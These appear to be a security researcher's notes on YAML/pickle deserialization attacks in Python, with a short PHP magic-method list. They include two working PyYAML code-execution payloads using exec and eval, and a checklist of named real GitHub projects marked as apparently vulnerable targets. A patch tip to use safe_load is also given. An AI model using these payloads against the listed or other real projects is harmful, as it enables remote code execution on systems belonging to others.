
# Python
https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter

### How to find Vulnerable package?

1. Common insecure deserialization code patterns
```python
yaml.load()

yaml.load("x",Loader=FullLoader)

pickle.load()
```
3. How to find a package?
	- Github
	- http://grep.app
	- Codeql:- https://lgtm.com/

### Is it Exploitable? / Writing an exploit
- Use python virtual environment
	- python3 -m venv \<envname\>

- Example package 
	- https://github.com/microsoft/nni

### Creating payloads
- Common payloads used:


#using python exec

```python
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"```
```
```python
```!!python/object/new:tuple
	- !!python/object/new:map
		- !!python/name:eval
		- ["RCE_HERE"]```

```


- More on payload https://github.com/yaml/pyyaml/issues/420
	- https://github.com/j0lt-github/python-deserialization-attack-payload-generator
	- https://github.com/artsploit/yaml-payload


### Patch 

- Use safe_load() instead of load().
- Use safeloader instead of fullloader.

# Projects
- [ ] https://github.com/deepmipt/dp-agent/blob/master/deeppavlov_agent/setup_agent.py
- [x] https://github.com/hongfz16/DS-Net/blob/main/utils/config.py
- [x] https://github.com/google/automl/blob/master/efficientdet/hparams_config.py
- [x] https://github.com/openvenues/libpostal/search?q=yaml.load%28
- [x] https://github.com/SsnL/dataset-distillation/blob/master/base_options.py
- [x] https://github.com/google/WebFundamentals
- [x] https://github.com/NVIDIA/DeepLearningExamples/blob/master/PyTorch/LanguageModeling/Transformer-XL/pytorch/eval.py
- [x] https://github.com/mlrun/mlrun/blob/development/mlrun/run.py
- [x] https://github.com/ubuntu/microk8s/blob/master/scripts/cluster/common/utils.py
- [x] https://github.com/lcdb/lcdb-wf/blob/master/lib/common.py
- [x] https://github.com/tianweiy/CenterPoint-KITTI/blob/main/pcdet/config.py
- [x] https://github.com/lunixbochs/glshim/blob/unstable/spec/gen.py
- [x] https://github.com/mitre/caldera/blob/master/tests/conftest.py
- [x] https://github.com/xinntao/BasicSR/blob/master/basicsr/utils/options.py
- [ ] 94 page from last (``yaml.load(`` )





# PHP
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/

### Magic methods
\_\_construct()
\_\_set()
\_\_toString()
\_\_destruct()
\_\_isset()
\_\_invoke()
\_\_call()
\_\_unset()
\_\_set\_state()
\_\_callStatic()
\_\_sleep()
\_\_clone()
\_\_get()
\_\_wakeup()
\_\_debugInfo()